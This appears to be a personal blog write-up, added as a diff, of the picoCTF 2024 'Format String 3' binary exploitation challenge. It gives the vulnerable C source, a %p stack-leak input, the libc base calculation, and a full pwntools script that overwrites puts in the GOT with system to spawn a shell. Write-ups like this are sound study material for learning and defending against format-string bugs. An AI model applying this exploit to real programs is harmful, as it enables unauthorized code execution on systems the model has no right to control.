@@ -1,0 +1,138 @@
+---
+title: picoCTF - 2024 - Pwn - Format String 3
+date: '2024-05-03'
+tags: ['ctf', 'pwn', 'picoctf', 'fmt', 'got-overwrite']
+draft: false
+summary: Overwriting GOT by exploiting the Format String Bug to make a system call for a shell. My first GOT overwrite solve.
+---
+
+## Challenge Description
+
+![Screenshot](/static/writeups/picoCTF/pwn/format-string-3/fmt3-1.png)
+
+## Solution
+
+Following files were provided:
+
+```
+format-string-3
+format-string-3.c
+libc.so.6
+ld-linux-x86-64.so.2
+```
+
+Before starting, I want to say that I am not an expert when it comes to binary exploitation. If you find mistakes in my write-ups, please let me know. I am open to any sort of constructive criticism.
+
+Source code provided to us:
+
+```c:format-string-3.c
+#include <stdio.h>
+
+#define MAX_STRINGS 32
+
+char *normal_string = "/bin/sh";
+
+void setup() {
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void hello() {
+	puts("Howdy gamers!");
+	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
+}
+
+int main() {
+	char *all_strings[MAX_STRINGS] = {NULL};
+	char buf[1024] = {'\0'};
+
+	setup();
+	hello();
+
+	fgets(buf, 1024, stdin);
+	printf(buf);
+
+	puts(normal_string);
+
+	return 0;
+}
+```
+
+The most interesting part in this code is:
+
+```c
+	puts(normal_string);
+```
+
+At the end of the main function, the parameter passed to the `puts` function (`normal_string`) contains the content "/bin/sh". If we can change this `puts` function into a system call, we can spawn a shell. This can be achieved by overwriting entries in the Global Offset Table (GOT), which is a table inside the binary that stores the memory addresses of different library calls. Let's take a look at it:
+
+![Screenshot](/static/writeups/picoCTF/pwn/format-string-3/fmt3-2.png)
+
+To overwrite GOT entry, we need to find the offset of our input string on the stack, offset of `setvbuf` from the libc base to calculate address of libc base (as the setvbuf is given).
+
+First, lets find out the starting index, i will pass 8 ‘A’ and will leak the addresses of the stack so that I can clearly see where the input is being stored:
+
+```
+AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
+```
+
+Here I can see that my offset is `38`:
+
+![Screenshot](/static/writeups/picoCTF/pwn/format-string-3/fmt3-3.png)
+
+Now, as the address of `setvbuf` is given, we only need to calcluate the address of libc base. For that, I need to know the offset of setvbuf from the libc base. It can be found using `objdump` on the binary:
+
+```bash:objdump-command
+objdump -T ./libc.so.6 | grep "setvbuf"
+```
+
+![Screenshot](/static/writeups/picoCTF/pwn/format-string-3/fmt3-4.png)
+
+This is how libc base address will be calculated:
+
+```python
+libc.address = <leaked_setvbuf_address> - 0x000000000007a3f0
+```
+
+For creating the payload, I took help from a Guide on **Format String Bug** written by [TheFlash2k](https://www.theflash2k.me/about).
+
+He has also explain how to overwrite entries on the GOT. **[[Source](https://www.theflash2k.me/blog/ctf-techs/fsb-guide#overwriting-entries-on-the-global-offset-table)]**
+
+So the final payload that I created:
+
+```python:payload.py
+#!/usr/bin/env python3
+from pwn import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./format-string-3"
+elf = context.binary = ELF(exe)
+libc = ELF("./libc.so.6")
+
+#io = process()
+io = remote("rhea.picoctf.net", 52286)
+
+if args.GDB: gdb.attach(io, "b *main+127") # gdb attachment
+
+start = 38
+
+io.recvuntil(b'setvbuf in libc: ')
+leak = int(io.recvline().strip(), 16)
+print("setvbuf @ %#x" % leak)
+
+libc.address = leak - 0x000000000007a3f0
+print("libc @ %#x" % libc.address)
+
+payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})
+
+io.sendline(payload)
+io.interactive()
+```
+
+### Flag:
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-3/fmt3-flag.png)
+
+> _That’s it for today’s blog, take Care_ 😃
